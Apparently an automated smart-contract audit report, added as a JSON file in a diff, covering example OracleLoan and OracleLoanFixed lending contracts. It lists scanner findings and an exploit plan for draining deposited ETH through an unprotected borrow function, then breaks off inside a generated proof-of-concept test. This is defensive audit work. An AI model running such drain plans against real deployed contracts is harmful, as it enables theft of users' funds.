@@ -1,0 +1,2284 @@
+{
+  "repo": "local:examples/oracle-lending",
+  "commit": "04956d3344474352ecea62e98f2f00c0792c69cec21288732516d00e6c1b776a",
+  "startedAt": "2026-11-06T17:05:02.533Z",
+  "finishedAt": "2026-11-06T17:05:13.386Z",
+  "tools": [
+    {
+      "name": "forge",
+      "version": "forge Version: 1.8.7"
+    },
+    {
+      "name": "slither",
+      "version": "0.11.6"
+    },
+    {
+      "name": "aderyn",
+      "version": "aderyn 0.6.8"
+    },
+    {
+      "name": "solc",
+      "version": "0.8.20,0.8.24,0.8.26,0.8.28,0.8.30,0.8.33,0.8.35,0.8.38"
+    },
+    {
+      "name": "pramaan-sandbox",
+      "version": "1"
+    }
+  ],
+  "build": {
+    "ok": true,
+    "log": "Compiling 23 files with Solc 0.8.30\nSolc 0.8.30 finished in 2.14s\nCompiler run successful!\nwarning[missing-events-access-control]: `debt` is changed without an event but is used for access control\n   ╭▸ src/OracleLoanFixed.sol:33:9\n   │\n33 │         debt[msg.sender] += amount;\n   │         ━━━━━━━━━━━━━━━━\n   │\n   ╰ help: https://getfoundry.sh/forge/linting/missing-events-access-control\n\nwarning[reentrancy-events]: event emitted after an external call; reentrancy can reorder or fabricate logs that off-chain consumers rely on\n   ╭▸ src/OracleLoanFixed.sol:36:9\n   │\n36 │         emit Borrowed(msg.sender, amount);\n   │         ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n   │\n   ╰ help: https://getfoundry.sh/forge/linting/reentrancy-events\n\nwarning[reentrancy-events]: event emitted after an external call; reentrancy can reorder or fabricate logs that off-chain consumers rely on\n   ╭▸ src/OracleLoanFixed.sol:47:9\n   │\n47 │         emit Repaid(msg.sender, paid);\n   │         ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n   │\n   ╰ help: https://getfoundry.sh/forge/linting/reentrancy-events\n\nwarning[block-timestamp]: usage of `block.timestamp` in a comparison may be manipulated by validators\n   ╭▸ src/OracleLoanFixed.sol:53:17\n   │\n53 │         require(block.timestamp - updatedAt <= MAX_AGE, \"stale oracle answer\");\n   │                 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n   │\n   ╰ help: https://getfoundry.sh/forge/linting/block-timestamp\n\nwarning[unused-return]: return value of an external call is not used\n   ╭▸ src/OracleLoanFixed.sol:51:50\n   │\n51 │         (, int256 answer,, uint256 updatedAt,) = feed.latestRoundData();\n   │                                                  ━━━━━━━━━━━━━━━━━━━━━━\n   │\n   ╰ help: https://getfoundry.sh/forge/linting/unused-return\n\nwarning[unsafe-typecast]: typecast can truncate values\n   ╭▸ src/OracleLoanFixed.sol:54:16\n   │\n54 │         return uint256(answer);\n   │                ━━━━━━━━━━━━━━━\n   │\n   ├ note: consider disabling this lint if you're certain the cast is safe\n   │       \n   │       // casting to 'uint256' is safe because [explain why]\n   │       // forge-lint: disable-next-line(unsafe-typecast)\n   │       \n   │       \n   ╰ help: https://getfoundry.sh/forge/linting/unsafe-typecast\n\nwarning[missing-events-access-control]: `debt` is changed without an event but is used for access control\n   ╭▸ src/OracleLoan.sol:37:9\n   │\n37 │         debt[msg.sender] += amount;\n   │         ━━━━━━━━━━━━━━━━\n   │\n   ╰ help: https://getfoundry.sh/forge/linting/missing-events-access-control\n\nwarning[reentrancy-events]: event emitted after an external call; reentrancy can reorder or fabricate logs that off-chain consumers rely on\n   ╭▸ src/OracleLoan.sol:40:9\n   │\n40 │         emit Borrowed(msg.sender, amount);\n   │         ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n   │\n   ╰ help: https://getfoundry.sh/forge/linting/reentrancy-events\n\nwarning[reentrancy-events]: event emitted after an external call; reentrancy can reorder or fabricate logs that off-chain consumers rely on\n   ╭▸ src/OracleLoan.sol:51:9\n   │\n51 │         emit Repaid(msg.sender, paid);\n   │         ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n   │\n   ╰ help: https://getfoundry.sh/forge/linting/reentrancy-events\n\nwarning[unused-return]: return value of an external call is not used\n   ╭▸ src/OracleLoan.sol:55:32\n   │\n55 │         (, int256 answer,,,) = feed.latestRoundData();\n   │                                ━━━━━━━━━━━━━━━━━━━━━━\n   │\n   ╰ help: https://getfoundry.sh/forge/linting/unused-return\n\nwarning[unsafe-typecast]: typecast can truncate values\n   ╭▸ src/OracleLoan.sol:56:16\n   │\n56 │         return uint256(answer);\n   │                ━━━━━━━━━━━━━━━\n   │\n   ├ note: consider disabling this lint if you're certain the cast is safe\n   │       \n   │       // casting to 'uint256' is safe because [explain why]\n   │       // forge-lint: disable-next-line(unsafe-typecast)\n   │       \n   │       \n   ╰ help: https://getfoundry.sh/forge/linting/unsafe-typecast\n\n"
+  },
+  "scanners": {
+    "slither": {
+      "ok": true,
+      "error": null,
+      "results": 10
+    },
+    "aderyn": {
+      "ok": true,
+      "error": null,
+      "results": 3
+    }
+  },
+  "contracts": [
+    {
+      "name": "OracleLoanFixed",
+      "source": "src/OracleLoanFixed.sol",
+      "kind": "contract",
+      "abstract": false,
+      "bases": [],
+      "deployable": true,
+      "abi": [
+        {
+          "type": "constructor",
+          "inputs": [
+            {
+              "name": "feed_",
+              "type": "address",
+              "internalType": "contract IPriceFeed"
+            }
+          ],
+          "stateMutability": "nonpayable"
+        },
+        {
+          "type": "function",
+          "name": "MAX_AGE",
+          "inputs": [],
+          "outputs": [
+            {
+              "name": "",
+              "type": "uint256",
+              "internalType": "uint256"
+            }
+          ],
+          "stateMutability": "view"
+        },
+        {
+          "type": "function",
+          "name": "REFERENCE_PRICE",
+          "inputs": [],
+          "outputs": [
+            {
+              "name": "",
+              "type": "uint256",
+              "internalType": "uint256"
+            }
+          ],
+          "stateMutability": "view"
+        },
+        {
+          "type": "function",
+          "name": "borrow",
+          "inputs": [
+            {
+              "name": "amount",
+              "type": "uint256",
+              "internalType": "uint256"
+            }
+          ],
+          "outputs": [],
+          "stateMutability": "nonpayable"
+        },
+        {
+          "type": "function",
+          "name": "collateral",
+          "inputs": [
+            {
+              "name": "account",
+              "type": "address",
+              "internalType": "address"
+            }
+          ],
+          "outputs": [
+            {
+              "name": "",
+              "type": "uint256",
+              "internalType": "uint256"
+            }
+          ],
+          "stateMutability": "view"
+        },
+        {
+          "type": "function",
+          "name": "debt",
+          "inputs": [
+            {
+              "name": "account",
+              "type": "address",
+              "internalType": "address"
+            }
+          ],
+          "outputs": [
+            {
+              "name": "",
+              "type": "uint256",
+              "internalType": "uint256"
+            }
+          ],
+          "stateMutability": "view"
+        },
+        {
+          "type": "function",
+          "name": "deposit",
+          "inputs": [],
+          "outputs": [],
+          "stateMutability": "payable"
+        },
+        {
+          "type": "function",
+          "name": "feed",
+          "inputs": [],
+          "outputs": [
+            {
+              "name": "",
+              "type": "address",
+              "internalType": "contract IPriceFeed"
+            }
+          ],
+          "stateMutability": "view"
+        },
+        {
+          "type": "function",
+          "name": "repay",
+          "inputs": [],
+          "outputs": [],
+          "stateMutability": "payable"
+        },
+        {
+          "type": "event",
+          "name": "Borrowed",
+          "inputs": [
+            {
+              "name": "account",
+              "type": "address",
+              "indexed": true,
+              "internalType": "address"
+            },
+            {
+              "name": "amount",
+              "type": "uint256",
+              "indexed": false,
+              "internalType": "uint256"
+            }
+          ],
+          "anonymous": false
+        },
+        {
+          "type": "event",
+          "name": "Deposited",
+          "inputs": [
+            {
+              "name": "account",
+              "type": "address",
+              "indexed": true,
+              "internalType": "address"
+            },
+            {
+              "name": "amount",
+              "type": "uint256",
+              "indexed": false,
+              "internalType": "uint256"
+            }
+          ],
+          "anonymous": false
+        },
+        {
+          "type": "event",
+          "name": "Repaid",
+          "inputs": [
+            {
+              "name": "account",
+              "type": "address",
+              "indexed": true,
+              "internalType": "address"
+            },
+            {
+              "name": "amount",
+              "type": "uint256",
+              "indexed": false,
+              "internalType": "uint256"
+            }
+          ],
+          "anonymous": false
+        }
+      ],
+      "functions": [
+        {
+          "name": "constructor",
+          "kind": "constructor",
+          "visibility": "public",
+          "stateMutability": "nonpayable",
+          "modifiers": [],
+          "parameters": [
+            {
+              "name": "feed_",
+              "type": "contract IPriceFeed"
+            }
+          ],
+          "src": {
+            "start": 678,
+            "length": 59,
+            "bodyStart": 708
+          },
+          "lines": [
+            19,
+            21
+          ]
+        },
+        {
+          "name": "deposit",
+          "kind": "function",
+          "visibility": "external",
+          "stateMutability": "payable",
+          "modifiers": [],
+          "parameters": [],
+          "src": {
+            "start": 743,
+            "length": 183,
+            "bodyStart": 779
+          },
+          "lines": [
+            23,
+            27
+          ]
+        },
+        {
+          "name": "borrow",
+          "kind": "function",
+          "visibility": "external",
+          "stateMutability": "nonpayable",
+          "modifiers": [],
+          "parameters": [
+            {
+              "name": "amount",
+              "type": "uint256"
+            }
+          ],
+          "src": {
+            "start": 932,
+            "length": 455,
+            "bodyStart": 973
+          },
+          "lines": [
+            29,
+            37
+          ]
+        },
+        {
+          "name": "repay",
+          "kind": "function",
+          "visibility": "external",
+          "stateMutability": "payable",
+          "modifiers": [],
+          "parameters": [],
+          "src": {
+            "start": 1393,
+            "length": 376,
+            "bodyStart": 1427
+          },
+          "lines": [
+            39,
+            48
+          ]
+        },
+        {
+          "name": "_price",
+          "kind": "function",
+          "visibility": "internal",
+          "stateMutability": "view",
+          "modifiers": [],
+          "parameters": [],
+          "src": {
+            "start": 1775,
+            "length": 296,
+            "bodyStart": 1825
+          },
+          "lines": [
+            50,
+            55
+          ]
+        }
+      ]
+    },
+    {
+      "name": "OracleLoan",
+      "source": "src/OracleLoan.sol",
+      "kind": "contract",
+      "abstract": false,
+      "bases": [],
+      "deployable": true,
+      "abi": [
+        {
+          "type": "constructor",
+          "inputs": [
+            {
+              "name": "feed_",
+              "type": "address",
+              "internalType": "contract IPriceFeed"
+            }
+          ],
+          "stateMutability": "nonpayable"
+        },
+        {
+          "type": "function",
+          "name": "REFERENCE_PRICE",
+          "inputs": [],
+          "outputs": [
+            {
+              "name": "",
+              "type": "uint256",
+              "internalType": "uint256"
+            }
+          ],
+          "stateMutability": "view"
+        },
+        {
+          "type": "function",
+          "name": "borrow",
+          "inputs": [
+            {
+              "name": "amount",
+              "type": "uint256",
+              "internalType": "uint256"
+            }
+          ],
+          "outputs": [],
+          "stateMutability": "nonpayable"
+        },
+        {
+          "type": "function",
+          "name": "collateral",
+          "inputs": [
+            {
+              "name": "account",
+              "type": "address",
+              "internalType": "address"
+            }
+          ],
+          "outputs": [
+            {
+              "name": "",
+              "type": "uint256",
+              "internalType": "uint256"
+            }
+          ],
+          "stateMutability": "view"
+        },
+        {
+          "type": "function",
+          "name": "debt",
+          "inputs": [
+            {
+              "name": "account",
+              "type": "address",
+              "internalType": "address"
+            }
+          ],
+          "outputs": [
+            {
+              "name": "",
+              "type": "uint256",
+              "internalType": "uint256"
+            }
+          ],
+          "stateMutability": "view"
+        },
+        {
+          "type": "function",
+          "name": "deposit",
+          "inputs": [],
+          "outputs": [],
+          "stateMutability": "payable"
+        },
+        {
+          "type": "function",
+          "name": "feed",
+          "inputs": [],
+          "outputs": [
+            {
+              "name": "",
+              "type": "address",
+              "internalType": "contract IPriceFeed"
+            }
+          ],
+          "stateMutability": "view"
+        },
+        {
+          "type": "function",
+          "name": "repay",
+          "inputs": [],
+          "outputs": [],
+          "stateMutability": "payable"
+        },
+        {
+          "type": "event",
+          "name": "Borrowed",
+          "inputs": [
+            {
+              "name": "account",
+              "type": "address",
+              "indexed": true,
+              "internalType": "address"
+            },
+            {
+              "name": "amount",
+              "type": "uint256",
+              "indexed": false,
+              "internalType": "uint256"
+            }
+          ],
+          "anonymous": false
+        },
+        {
+          "type": "event",
+          "name": "Deposited",
+          "inputs": [
+            {
+              "name": "account",
+              "type": "address",
+              "indexed": true,
+              "internalType": "address"
+            },
+            {
+              "name": "amount",
+              "type": "uint256",
+              "indexed": false,
+              "internalType": "uint256"
+            }
+          ],
+          "anonymous": false
+        },
+        {
+          "type": "event",
+          "name": "Repaid",
+          "inputs": [
+            {
+              "name": "account",
+              "type": "address",
+              "indexed": true,
+              "internalType": "address"
+            },
+            {
+              "name": "amount",
+              "type": "uint256",
+              "indexed": false,
+              "internalType": "uint256"
+            }
+          ],
+          "anonymous": false
+        }
+      ],
+      "functions": [
+        {
+          "name": "constructor",
+          "kind": "constructor",
+          "visibility": "public",
+          "stateMutability": "nonpayable",
+          "modifiers": [],
+          "parameters": [
+            {
+              "name": "feed_",
+              "type": "contract IPriceFeed"
+            }
+          ],
+          "src": {
+            "start": 1127,
+            "length": 59,
+            "bodyStart": 1157
+          },
+          "lines": [
+            23,
+            25
+          ]
+        },
+        {
+          "name": "deposit",
+          "kind": "function",
+          "visibility": "external",
+          "stateMutability": "payable",
+          "modifiers": [],
+          "parameters": [],
+          "src": {
+            "start": 1192,
+            "length": 183,
+            "bodyStart": 1228
+          },
+          "lines": [
+            27,
+            31
+          ]
+        },
+        {
+          "name": "borrow",
+          "kind": "function",
+          "visibility": "external",
+          "stateMutability": "nonpayable",
+          "modifiers": [],
+          "parameters": [
+            {
+              "name": "amount",
+              "type": "uint256"
+            }
+          ],
+          "src": {
+            "start": 1381,
+            "length": 455,
+            "bodyStart": 1422
+          },
+          "lines": [
+            33,
+            41
+          ]
+        },
+        {
+          "name": "repay",
+          "kind": "function",
+          "visibility": "external",
+          "stateMutability": "payable",
+          "modifiers": [],
+          "parameters": [],
+          "src": {
+            "start": 1842,
+            "length": 376,
+            "bodyStart": 1876
+          },
+          "lines": [
+            43,
+            52
+          ]
+        },
+        {
+          "name": "_price",
+          "kind": "function",
+          "visibility": "internal",
+          "stateMutability": "view",
+          "modifiers": [],
+          "parameters": [],
+          "src": {
+            "start": 2224,
+            "length": 144,
+            "bodyStart": 2274
+          },
+          "lines": [
+            54,
+            57
+          ]
+        }
+      ]
+    },
+    {
+      "name": "IPriceFeed",
+      "source": "src/IPriceFeed.sol",
+      "kind": "interface",
+      "abstract": false,
+      "bases": [],
+      "deployable": false,
+      "abi": [
+        {
+          "type": "function",
+          "name": "decimals",
+          "inputs": [],
+          "outputs": [
+            {
+              "name": "",
+              "type": "uint8",
+              "internalType": "uint8"
+            }
+          ],
+          "stateMutability": "view"
+        },
+        {
+          "type": "function",
+          "name": "latestAnswer",
+          "inputs": [],
+          "outputs": [
+            {
+              "name": "",
+              "type": "int256",
+              "internalType": "int256"
+            }
+          ],
+          "stateMutability": "view"
+        },
+        {
+          "type": "function",
+          "name": "latestRoundData",
+          "inputs": [],
+          "outputs": [
+            {
+              "name": "roundId",
+              "type": "uint80",
+              "internalType": "uint80"
+            },
+            {
+              "name": "answer",
+              "type": "int256",
+              "internalType": "int256"
+            },
+            {
+              "name": "startedAt",
+              "type": "uint256",
+              "internalType": "uint256"
+            },
+            {
+              "name": "updatedAt",
+              "type": "uint256",
+              "internalType": "uint256"
+            },
+            {
+              "name": "answeredInRound",
+              "type": "uint80",
+              "internalType": "uint80"
+            }
+          ],
+          "stateMutability": "view"
+        }
+      ],
+      "functions": [
+        {
+          "name": "decimals",
+          "kind": "function",
+          "visibility": "external",
+          "stateMutability": "view",
+          "modifiers": [],
+          "parameters": [],
+          "src": {
+            "start": 176,
+            "length": 50,
+            "bodyStart": null
+          },
+          "lines": [
+            6,
+            6
+          ]
+        },
+        {
+          "name": "latestAnswer",
+          "kind": "function",
+          "visibility": "external",
+          "stateMutability": "view",
+          "modifiers": [],
+          "parameters": [],
+          "src": {
+            "start": 232,
+            "length": 55,
+            "bodyStart": null
+          },
+          "lines": [
+            8,
+            8
+          ]
+        },
+        {
+          "name": "latestRoundData",
+          "kind": "function",
+          "visibility": "external",
+          "stateMutability": "view",
+          "modifiers": [],
+          "parameters": [],
+          "src": {
+            "start": 293,
+            "length": 167,
+            "bodyStart": null
+          },
+          "lines": [
+            10,
+            13
+          ]
+        }
+      ]
+    }
+  ],
+  "candidates": [
+    {
+      "key": "access-control:OracleLoan:borrow(uint256)",
+      "vulnClass": "access-control",
+      "title": "Missing access control on a value-moving function",
+      "severity": "high",
+      "confidence": "high",
+      "contract": "OracleLoan",
+      "function": "borrow(uint256)",
+      "file": "src/OracleLoan.sol",
+      "lines": [
+        33,
+        34,
+        35,
+        36,
+        37,
+        38,
+        39,
+        40,
+        41
+      ],
+      "sources": [
+        {
+          "tool": "slither",
+          "detector": "pramaan-unprotected-sweep",
+          "description": "OracleLoan.borrow(uint256) (src/OracleLoan.sol#33-41) moves the contract's entire balance and does not restrict msg.sender"
+        },
+        {
+          "tool": "aderyn",
+          "detector": "eth-send-unchecked-address",
+          "description": "ETH transferred without address checks"
+        }
+      ]
+    },
+    {
+      "key": "access-control:OracleLoan:repay()",
+      "vulnClass": "access-control",
+      "title": "Missing access control on a value-moving function",
+      "severity": "high",
+      "confidence": "medium",
+      "contract": "OracleLoan",
+      "function": "repay()",
+      "file": "src/OracleLoan.sol",
+      "lines": [
+        43
+      ],
+      "sources": [
+        {
+          "tool": "aderyn",
+          "detector": "eth-send-unchecked-address",
+          "description": "ETH transferred without address checks"
+        }
+      ]
+    },
+    {
+      "key": "access-control:OracleLoanFixed:borrow(uint256)",
+      "vulnClass": "access-control",
+      "title": "Missing access control on a value-moving function",
+      "severity": "high",
+      "confidence": "high",
+      "contract": "OracleLoanFixed",
+      "function": "borrow(uint256)",
+      "file": "src/OracleLoanFixed.sol",
+      "lines": [
+        29,
+        30,
+        31,
+        32,
+        33,
+        34,
+        35,
+        36,
+        37
+      ],
+      "sources": [
+        {
+          "tool": "slither",
+          "detector": "pramaan-unprotected-sweep",
+          "description": "OracleLoanFixed.borrow(uint256) (src/OracleLoanFixed.sol#29-37) moves the contract's entire balance and does not restrict msg.sender"
+        },
+        {
+          "tool": "aderyn",
+          "detector": "eth-send-unchecked-address",
+          "description": "ETH transferred without address checks"
+        }
+      ]
+    },
+    {
+      "key": "access-control:OracleLoanFixed:repay()",
+      "vulnClass": "access-control",
+      "title": "Missing access control on a value-moving function",
+      "severity": "high",
+      "confidence": "medium",
+      "contract": "OracleLoanFixed",
+      "function": "repay()",
+      "file": "src/OracleLoanFixed.sol",
+      "lines": [
+        39
+      ],
+      "sources": [
+        {
+          "tool": "aderyn",
+          "detector": "eth-send-unchecked-address",
+          "description": "ETH transferred without address checks"
+        }
+      ]
+    },
+    {
+      "key": "unchecked-oracle:OracleLoan:borrow(uint256)",
+      "vulnClass": "unchecked-oracle",
+      "title": "Oracle answer used without checking that it is positive",
+      "severity": "high",
+      "confidence": "medium",
+      "contract": "OracleLoan",
+      "function": "borrow(uint256)",
+      "file": "src/OracleLoan.sol",
+      "lines": [
+        33,
+        34,
+        35,
+        36,
+        37,
+        38,
+        39,
+        40,
+        41
+      ],
+      "sources": [
+        {
+          "tool": "slither",
+          "detector": "pramaan-unchecked-oracle",
+          "description": "OracleLoan.borrow(uint256) (src/OracleLoan.sol#33-41) uses a price feed answer without requiring it to be positive"
+        }
+      ]
+    },
+    {
+      "key": "unused-return:OracleLoan:_price()",
+      "vulnClass": "unused-return",
+      "title": "unused-return",
+      "severity": "medium",
+      "confidence": "medium",
+      "contract": "OracleLoan",
+      "function": "_price()",
+      "file": "src/OracleLoan.sol",
+      "lines": [
+        54,
+        55,
+        56,
+        57
+      ],
+      "sources": [
+        {
+          "tool": "slither",
+          "detector": "unused-return",
+          "description": "OracleLoan._price() (src/OracleLoan.sol#54-57) ignores return value by (None,answer,None,None,None) = feed.latestRoundData() (src/OracleLoan.sol#55)"
+        }
+      ]
+    },
+    {
+      "key": "unused-return:OracleLoanFixed:_price()",
+      "vulnClass": "unused-return",
+      "title": "unused-return",
+      "severity": "medium",
+      "confidence": "medium",
+      "contract": "OracleLoanFixed",
+      "function": "_price()",
+      "file": "src/OracleLoanFixed.sol",
+      "lines": [
+        50,
+        51,
+        52,
+        53,
+        54,
+        55
+      ],
+      "sources": [
+        {
+          "tool": "slither",
+          "detector": "unused-return",
+          "description": "OracleLoanFixed._price() (src/OracleLoanFixed.sol#50-55) ignores return value by (None,answer,None,updatedAt,None) = feed.latestRoundData() (src/OracleLoanFixed.sol#51)"
+        }
+      ]
+    },
+    {
+      "key": "push-zero-opcode:src/IPriceFeed.sol:L2",
+      "vulnClass": "push-zero-opcode",
+      "title": "PUSH0 Opcode",
+      "severity": "low",
+      "confidence": "medium",
+      "contract": "src/IPriceFeed.sol",
+      "function": null,
+      "file": "src/IPriceFeed.sol",
+      "lines": [
+        2
+      ],
+      "sources": [
+        {
+          "tool": "aderyn",
+          "detector": "push-zero-opcode",
+          "description": "PUSH0 Opcode"
+        }
+      ]
+    },
+    {
+      "key": "push-zero-opcode:src/OracleLoan.sol:L2",
+      "vulnClass": "push-zero-opcode",
+      "title": "PUSH0 Opcode",
+      "severity": "low",
+      "confidence": "medium",
+      "contract": "src/OracleLoan.sol",
+      "function": null,
+      "file": "src/OracleLoan.sol",
+      "lines": [
+        2
+      ],
+      "sources": [
+        {
+          "tool": "aderyn",
+          "detector": "push-zero-opcode",
+          "description": "PUSH0 Opcode"
+        }
+      ]
+    },
+    {
+      "key": "push-zero-opcode:src/OracleLoanFixed.sol:L2",
+      "vulnClass": "push-zero-opcode",
+      "title": "PUSH0 Opcode",
+      "severity": "low",
+      "confidence": "medium",
+      "contract": "src/OracleLoanFixed.sol",
+      "function": null,
+      "file": "src/OracleLoanFixed.sol",
+      "lines": [
+        2
+      ],
+      "sources": [
+        {
+          "tool": "aderyn",
+          "detector": "push-zero-opcode",
+          "description": "PUSH0 Opcode"
+        }
+      ]
+    },
+    {
+      "key": "reentrancy-events:OracleLoan:borrow(uint256)",
+      "vulnClass": "reentrancy-events",
+      "title": "reentrancy-events",
+      "severity": "low",
+      "confidence": "medium",
+      "contract": "OracleLoan",
+      "function": "borrow(uint256)",
+      "file": "src/OracleLoan.sol",
+      "lines": [
+        33,
+        34,
+        35,
+        36,
+        37,
+        38,
+        39,
+        40,
+        41
+      ],
+      "sources": [
+        {
+          "tool": "slither",
+          "detector": "reentrancy-events",
+          "description": "Reentrancy in OracleLoan.borrow(uint256) (src/OracleLoan.sol#33-41):\n\tExternal calls:\n\t- (ok,None) = msg.sender.call{value: amount}() (src/OracleLoan.sol#38)\n\tEvent emitted after the call(s):\n\t- Borrowed(msg.sender,amount) (src/OracleLoan.sol#40)"
+        }
+      ]
+    },
+    {
+      "key": "reentrancy-events:OracleLoan:repay()",
+      "vulnClass": "reentrancy-events",
+      "title": "reentrancy-events",
+      "severity": "low",
+      "confidence": "medium",
+      "contract": "OracleLoan",
+      "function": "repay()",
+      "file": "src/OracleLoan.sol",
+      "lines": [
+        43,
+        44,
+        45,
+        46,
+        47,
+        48,
+        49,
+        50,
+        51,
+        52
+      ],
+      "sources": [
+        {
+          "tool": "slither",
+          "detector": "reentrancy-events",
+          "description": "Reentrancy in OracleLoan.repay() (src/OracleLoan.sol#43-52):\n\tExternal calls:\n\t- (ok,None) = msg.sender.call{value: msg.value - paid}() (src/OracleLoan.sol#48)\n\tEvent emitted after the call(s):\n\t- Repaid(msg.sender,paid) (src/OracleLoan.sol#51)"
+        }
+      ]
+    },
+    {
+      "key": "reentrancy-events:OracleLoanFixed:borrow(uint256)",
+      "vulnClass": "reentrancy-events",
+      "title": "reentrancy-events",
+      "severity": "low",
+      "confidence": "medium",
+      "contract": "OracleLoanFixed",
+      "function": "borrow(uint256)",
+      "file": "src/OracleLoanFixed.sol",
+      "lines": [
+        29,
+        30,
+        31,
+        32,
+        33,
+        34,
+        35,
+        36,
+        37
+      ],
+      "sources": [
+        {
+          "tool": "slither",
+          "detector": "reentrancy-events",
+          "description": "Reentrancy in OracleLoanFixed.borrow(uint256) (src/OracleLoanFixed.sol#29-37):\n\tExternal calls:\n\t- (ok,None) = msg.sender.call{value: amount}() (src/OracleLoanFixed.sol#34)\n\tEvent emitted after the call(s):\n\t- Borrowed(msg.sender,amount) (src/OracleLoanFixed.sol#36)"
+        }
+      ]
+    },
+    {
+      "key": "reentrancy-events:OracleLoanFixed:repay()",
+      "vulnClass": "reentrancy-events",
+      "title": "reentrancy-events",
+      "severity": "low",
+      "confidence": "medium",
+      "contract": "OracleLoanFixed",
+      "function": "repay()",
+      "file": "src/OracleLoanFixed.sol",
+      "lines": [
+        39,
+        40,
+        41,
+        42,
+        43,
+        44,
+        45,
+        46,
+        47,
+        48
+      ],
+      "sources": [
+        {
+          "tool": "slither",
+          "detector": "reentrancy-events",
+          "description": "Reentrancy in OracleLoanFixed.repay() (src/OracleLoanFixed.sol#39-48):\n\tExternal calls:\n\t- (ok,None) = msg.sender.call{value: msg.value - paid}() (src/OracleLoanFixed.sol#44)\n\tEvent emitted after the call(s):\n\t- Repaid(msg.sender,paid) (src/OracleLoanFixed.sol#47)"
+        }
+      ]
+    },
+    {
+      "key": "timestamp:OracleLoanFixed:_price()",
+      "vulnClass": "timestamp",
+      "title": "timestamp",
+      "severity": "low",
+      "confidence": "medium",
+      "contract": "OracleLoanFixed",
+      "function": "_price()",
+      "file": "src/OracleLoanFixed.sol",
+      "lines": [
+        50,
+        51,
+        52,
+        53,
+        54,
+        55
+      ],
+      "sources": [
+        {
+          "tool": "slither",
+          "detector": "timestamp",
+          "description": "OracleLoanFixed._price() (src/OracleLoanFixed.sol#50-55) uses timestamp for comparisons\n\tDangerous comparisons:\n\t- require(bool,string)(block.timestamp - updatedAt <= MAX_AGE,stale oracle answer) (src/OracleLoanFixed.sol#53)"
+        }
+      ]
+    },
+    {
+      "key": "unspecific-solidity-pragma:src/IPriceFeed.sol:L2",
+      "vulnClass": "unspecific-solidity-pragma",
+      "title": "Unspecific Solidity Pragma",
+      "severity": "low",
+      "confidence": "medium",
+      "contract": "src/IPriceFeed.sol",
+      "function": null,
+      "file": "src/IPriceFeed.sol",
+      "lines": [
+        2
+      ],
+      "sources": [
+        {
+          "tool": "aderyn",
+          "detector": "unspecific-solidity-pragma",
+          "description": "Unspecific Solidity Pragma"
+        }
+      ]
+    },
+    {
+      "key": "unspecific-solidity-pragma:src/OracleLoan.sol:L2",
+      "vulnClass": "unspecific-solidity-pragma",
+      "title": "Unspecific Solidity Pragma",
+      "severity": "low",
+      "confidence": "medium",
+      "contract": "src/OracleLoan.sol",
+      "function": null,
+      "file": "src/OracleLoan.sol",
+      "lines": [
+        2
+      ],
+      "sources": [
+        {
+          "tool": "aderyn",
+          "detector": "unspecific-solidity-pragma",
+          "description": "Unspecific Solidity Pragma"
+        }
+      ]
+    },
+    {
+      "key": "unspecific-solidity-pragma:src/OracleLoanFixed.sol:L2",
+      "vulnClass": "unspecific-solidity-pragma",
+      "title": "Unspecific Solidity Pragma",
+      "severity": "low",
+      "confidence": "medium",
+      "contract": "src/OracleLoanFixed.sol",
+      "function": null,
+      "file": "src/OracleLoanFixed.sol",
+      "lines": [
+        2
+      ],
+      "sources": [
+        {
+          "tool": "aderyn",
+          "detector": "unspecific-solidity-pragma",
+          "description": "Unspecific Solidity Pragma"
+        }
+      ]
+    }
+  ],
+  "findings": [
+    {
+      "id": "PRM-1",
+      "candidate": {
+        "key": "access-control:OracleLoan:borrow(uint256)",
+        "vulnClass": "access-control",
+        "title": "Missing access control on a value-moving function",
+        "severity": "high",
+        "confidence": "high",
+        "contract": "OracleLoan",
+        "function": "borrow(uint256)",
+        "file": "src/OracleLoan.sol",
+        "lines": [
+          33,
+          34,
+          35,
+          36,
+          37,
+          38,
+          39,
+          40,
+          41
+        ],
+        "sources": [
+          {
+            "tool": "slither",
+            "detector": "pramaan-unprotected-sweep",
+            "description": "OracleLoan.borrow(uint256) (src/OracleLoan.sol#33-41) moves the contract's entire balance and does not restrict msg.sender"
+          },
+          {
+            "tool": "aderyn",
+            "detector": "eth-send-unchecked-address",
+            "description": "ETH transferred without address checks"
+          }
+        ]
+      },
+      "templateId": "access-control-drain",
+      "plan": {
+        "templateId": "access-control-drain",
+        "version": "1",
+        "filledBy": "heuristics",
+        "target": {
+          "name": "OracleLoan",
+          "source": "src/OracleLoan.sol"
+        },
+        "deploy": {
+          "kind": "direct",
+          "ctorArgs": [
+            "address(feed)"
+          ],
+          "initializer": null,
+          "lowLevelCreate": true
+        },
+        "fund": {
+          "fn": "deposit",
+          "valueExpr": "SEED"
+        },
+        "attack": {
+          "fn": "borrow",
+          "args": [
+            "SEED"
+          ]
+        },
+        "drain": null,
+        "hasOwnerGetter": false,
+        "hypothesis": "OracleLoan.borrow(uint256) moves the contract's ETH without checking who calls it.",
+        "property": "An account with no role must not be able to take ETH that other users deposited.",
+        "preconditions": [
+          "a victim has deposited SEED (10 ether) via deposit",
+          "the attacker holds no role in the contract"
+        ]
+      },
+      "planError": null,
+      "test": {
+        "fileName": "PramaanExploit_PRM_1.t.sol",
+        "contractName": "PramaanExploit_PRM_1",
+        "source": "// SPDX-License-Identifier: UNLICENSED\n// Generated by Pramaan for finding PRM-1: template access-control-drain@1, slots filled by heuristics.\n// Hypothesis: OracleLoan.borrow(uint256) moves the contract's ETH without checking who calls it.\n// Property under test: An account with no role must not be able to take ETH that other users deposited.\n// Passing on the vulnerable code reproduces the bug. On fixed code this test must fail (revert or property assertion).\npragma solidity >=0.8.0 <0.9.0;\n\nimport {Test} from \"lib/pramaan-forge-std/src/Test.sol\";\nimport {OracleLoan as PramaanTarget} from \"src/OracleLoan.sol\";\n\n/// Chainlink-style price feed whose answer the test controls. It models a FEED FAILURE (invalid round, circuit-breaker\n/// value, compromised aggregator); it is not something the attacker could do on a healthy feed.\ncontract PramaanMockFeed {\n    uint8 public constant decimals = 8;\n    int256 public answer;\n    uint256 public updatedAt;\n\n    constructor(int256 initialAnswer) {\n        answer = initialAnswer;\n        updatedAt = block.timestamp;\n    }\n\n    function set(int256 newAnswer) external {\n        answer = newAnswer;\n        updatedAt = block.timestamp;\n    }\n\n    function latestAnswer() external 